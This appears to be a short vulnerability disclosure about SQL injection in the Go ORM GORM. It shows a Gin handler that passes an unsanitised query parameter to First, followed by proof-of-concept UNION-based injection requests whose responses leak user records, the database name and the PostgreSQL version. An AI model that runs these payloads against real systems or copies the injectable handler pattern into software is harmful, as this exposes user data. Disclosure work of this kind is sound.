# Simple  Sql Injection In GORM


## issue 

https://github.com/jinzhu/gorm/issues/2517
moved to
https://github.com/go-gorm/gorm/issues/2517

## Sql Injection In First and Find Function in Gorm
```go
func GetUser(c *gin.Context) {
	var user []models.User
	dbms := db.GetDatabaseConnection() /*  Open connectins */
	defer dbms.Close()
	id := c.Query("id")
    // localhost:8080/user?id=id=1)) or 1=1--
	err := dbms.First(&user, id) // Sql Injection in this line /user?id=id=1)) or 1=1--
	if err == nil {
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "success", "result": user})

	} else {
		c.JSON(http.StatusBadRequest, gin.H{"status": http.StatusBadRequest, "message": "something error", "result": err})
	}
	return

}

```
## POC with httpie
```
$ http "localhost:8080/user?id=id=1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
HTTP/1.1 400 Bad Request
Content-Length: 456
Content-Type: application/json; charset=utf-8
Date: Fri, 21 Jun 2019 10:31:22 GMT

{
    "message": "something error",
    "result": {
        "Error": null,
        "RowsAffected": 2,
        "Value": [
            {
                "address": "Indonesia",
                "createdAt": "2019-06-21T08:28:15.633152Z",
                "email": "wahyu@gmail.com",
                "id": 1,
                "role": "user",
                "updatedAt": "2019-06-21T08:28:15.633152Z",
                "username": "wahyu"
            },
            {
                "address": "",
                "email": "test", // database name
                "id": 0,
                "role": "PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit", // Version Of DB
                "username": ""
            }
        ]
    },
    "status": 400
}

```
or 

```
$ http "localhost:8080/user?id=1)) = ((1)) UNION ALL SELECT NULL,version(),current_database(),NULL,NULL,NULL,NULL,NULL--"
HTTP/1.1 400 Bad Request
Content-Length: 625
Content-Type: application/json; charset=utf-8
Date: Fri, 21 Jun 2019 10:52:23 GMT

{
    "message": "something error",
    "result": {
        "Error": null,
        "RowsAffected": 3,
        "Value": [
            {
                "address": "Indonesia",
                "createdAt": "2019-06-21T08:31:52.306189Z",
                "email": "ari@gmail.com",
                "id": 2,
                "role": "ari",
                "updatedAt": "2019-06-21T08:31:52.306189Z",
                "username": "ari"
            },
            {
                "address": "Indonesia",
                "createdAt": "2019-06-21T08:28:15.633152Z",
                "email": "wahyu@gmail.com",
                "id": 1,
                "role": "user",
                "updatedAt": "2019-06-21T08:28:15.633152Z",
                "username": "wahyu"
            },
            {
                "address": "",
                "email": "test",
                "id": 0,
                "role": "PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit",
                "username": ""
            }
        ]
    },
    "status": 400
}

```
**Berbagilah Walau hanya Satu Line Of Code**
